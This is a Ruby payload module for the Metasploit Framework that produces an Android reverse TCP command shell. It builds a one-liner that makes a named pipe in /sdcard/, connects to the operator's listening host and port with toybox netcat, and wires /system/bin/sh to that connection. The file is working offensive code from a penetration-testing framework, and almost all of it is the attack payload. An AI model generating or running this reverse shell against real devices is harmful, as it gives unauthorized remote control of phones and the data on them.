##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Android Command Shell, Reverse TCP (via netcat)',
      'Description'   => 'Creates an interactive shell via netcat',
      'Author'        => [ 'Auxilus' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'toybox',
      'Payload'       => { 'Offsets' => { }, 'Payload' => '' }
      ))
    register_options(
      [
        OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
        OptString.new('NETCAT', [ true, "The netcat command to use.", "toybox nc" ]),
        OptString.new('MKFIFO', [ true, "The mkfifo command to use.", "mkfifo" ]),
        OptString.new('WritableDir', [ true, "The temporary directory to use.", "/sdcard/" ]),
      ])
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    backpipe = datastore['WritableDir'] + Rex::Text.rand_text_alpha_lower(4+rand(4))
    "#{datastore['MKFIFO']} #{backpipe}; #{datastore['NETCAT']} #{datastore['LHOST']} #{datastore['LPORT']} 0<#{backpipe} | #{datastore['SHELL']} >#{backpipe} 2>&1; rm #{backpipe}"
  end
end
